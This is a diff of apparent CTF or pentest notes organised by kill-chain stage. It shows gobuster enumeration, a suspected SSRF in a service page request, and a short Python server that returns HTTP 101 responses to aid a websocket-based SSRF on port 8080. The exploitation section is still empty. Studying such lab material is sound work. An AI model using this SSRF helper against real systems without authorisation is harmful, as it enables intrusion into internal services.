@@ -9,7 +9,7 @@
 ##### **Conclusion**
 **Time :** 
 	**Start :** 28.03.2025 18:10
-	**Break at/to :** 28.03.2025 19:27 / 29.03.2025 16:05
+	**Break at/to :** 28.03.2025 19:27 / 29.03.2025 16:11
 	**Finish :** 
 **Satisfaction :**  
 ### 1. **Reconnaissance
@@ -204,6 +204,11 @@ Starting gobuster in directory enumeration mode
 /envelope_small.htm   (Status: 403) [Size: 146]
 ```
 
+On the service page we have zhis request :
+![[Pasted image 20250329161122.png]]
+
+It's possible exploitable to #SSRF.
+
 
 
 Port `80`
@@ -220,7 +225,31 @@ Port `631`
 
 ## 2. **Weaponization
 
+server.py for our #SSRF :
+
+```PYTHON
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+if len(sys.argv)-1 != 1:
+    print("""
+Usage: {} 
+    """.format(sys.argv[0]))
+    sys.exit()
+
+class Redirect(BaseHTTPRequestHandler):
+   def do_GET(self):
+       self.protocol_version = "HTTP/1.1"
+       self.send_response(101)
+       self.end_headers()
+
+HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
+```
+
 ## 3. **Delivery
+
+For the #SSRF on the port `8080` we saw that the server use websocket so we need to update our request :
+
 
 ## 4. **Exploitation
 
